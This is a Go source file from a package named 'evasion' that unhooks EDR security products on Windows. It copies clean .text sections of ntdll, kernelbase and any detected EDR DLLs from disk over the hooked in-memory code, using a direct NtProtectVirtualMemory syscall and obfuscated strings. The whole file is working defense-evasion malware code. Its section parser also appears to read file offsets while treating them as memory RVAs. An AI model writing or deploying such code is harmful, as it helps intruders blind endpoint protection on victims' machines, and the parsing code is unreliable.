//go:build windows

package evasion

import (
	"os"
	"unsafe"
)

// pageExecuteReadWrite is the Windows PAGE_EXECUTE_READWRITE protection constant.
const pageExecuteReadWrite = 0x40

// pageExecuteRead is the Windows PAGE_EXECUTE_READ protection constant.
const pageExecuteRead = 0x20

// UnhookEDRs walks all loaded modules, identifies EDR-hooked DLLs by name pattern,
// and restores their .text sections from clean on-disk copies.
func UnhookEDRs() {
	// Always unhook ntdll.dll first (most critical — all EDRs hook here)
	unhookDLL(Obf(SNtdll))
	unhookDLL(Obf(SKernelbase))

	// Then check for any EDR-specific DLLs loaded in our process
	for _, m := range FindEDRModules() {
		unhookDLL(m.Name)
	}
}

// unhookDLL restores the .text section of a loaded DLL from its clean disk copy.
func unhookDLL(dllName string) {
	mod := FindModule(dllName)
	if mod == nil {
		return
	}

	// Build path to on-disk copy
	sysDir := os.Getenv("SystemRoot")
	if sysDir == "" {
		sysDir = `C:\Windows`
	}
	diskPath := sysDir + `\System32\` + dllName

	// Read clean copy from disk
	cleanBytes, err := os.ReadFile(diskPath)
	if err != nil {
		// Try SysWOW64 fallback
		diskPath = sysDir + `\SysWOW64\` + dllName
		cleanBytes, err = os.ReadFile(diskPath)
		if err != nil {
			return // Can't read — skip gracefully
		}
	}

	// Parse the on-disk .text section
	textRVA, textSize := findTextSection(cleanBytes)
	if textSize == 0 {
		return
	}

	// Get pointer to the in-memory .text section
	memTextAddr := mod.Base + uintptr(textRVA)
	memText := unsafe.Slice((*byte)(unsafe.Pointer(memTextAddr)), textSize)
	diskText := cleanBytes[textRVA : textRVA+textSize]

	// Make .text writable via direct syscall (NtProtectVirtualMemory)
	base := memTextAddr
	size := uintptr(textSize)
	var oldProtect uint32

	status := NtProtectVirtualMemory(
		uintptr(0xFFFFFFFFFFFFFFFF), // NtCurrentProcess() pseudo-handle
		&base,
		&size,
		pageExecuteReadWrite,
		&oldProtect,
	)
	if status != 0 {
		return
	}

	// Overwrite hooked bytes with clean bytes
	copy(memText, diskText)

	// Restore original protection
	NtProtectVirtualMemory(
		uintptr(0xFFFFFFFFFFFFFFFF),
		&base,
		&size,
		oldProtect,
		&oldProtect,
	)
}

// findTextSection parses a raw PE byte slice and returns the .text section's RVA and size.
func findTextSection(pe []byte) (rva uint32, size uint32) {
	if len(pe) < 0x40 {
		return 0, 0
	}
	// e_lfanew at 0x3C
	peOffset := uint32(pe[0x3C]) | uint32(pe[0x3D])<<8 | uint32(pe[0x3E])<<16 | uint32(pe[0x3F])<<24
	if int(peOffset)+24 >= len(pe) {
		return 0, 0
	}
	// Check PE signature
	if pe[peOffset] != 'P' || pe[peOffset+1] != 'E' {
		return 0, 0
	}
	// Number of sections at PE+6
	numSections := uint16(pe[peOffset+6]) | uint16(pe[peOffset+7])<<8
	// Size of optional header at PE+20
	optSize := uint16(pe[peOffset+20]) | uint16(pe[peOffset+21])<<8
	// Section table starts after COFF header (20 bytes) + optional header
	sectionBase := peOffset + 4 + 20 + uint32(optSize)

	for i := 0; i < int(numSections); i++ {
		off := sectionBase + uint32(i)*40
		if int(off)+40 > len(pe) {
			break
		}
		name := string(pe[off : off+8])
		// ".text\x00\x00\x00"
		if len(name) >= 5 && name[:5] == ".text" {
			size = uint32(pe[off+16]) | uint32(pe[off+17])<<8 | uint32(pe[off+18])<<16 | uint32(pe[off+19])<<24
			rva = uint32(pe[off+20]) | uint32(pe[off+21])<<8 | uint32(pe[off+22])<<16 | uint32(pe[off+23])<<24
			return rva, size
		}
	}
	return 0, 0
}
